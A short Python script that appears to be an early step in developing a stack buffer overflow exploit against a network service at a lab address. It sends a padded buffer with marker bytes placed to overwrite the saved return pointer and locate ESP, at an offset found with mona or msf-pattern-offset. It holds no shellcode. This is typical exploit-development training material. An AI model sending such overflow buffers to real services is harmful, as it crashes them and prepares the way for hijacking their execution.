#!/usr/bin/env python
import socket

# target --
RHOST = "192.168.0.139"
RPORT = 31337

# create socket --
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# total buf(len)
# offset from mona! / msf-pattern-offeset
buf_totalen = 1024
offset_srp = 146 

# test offsets --
buf = ""
buf += "A"*(offset_srp - len(buf)) # padding
buf += "BBBB"	# SRP overwrite
buf += "CCCC"	# ESP location
buf += "D"*(buf_totalen - len(buf))	#trailing padding
buf += "\n"

# send the buffer --
s.send(buf)
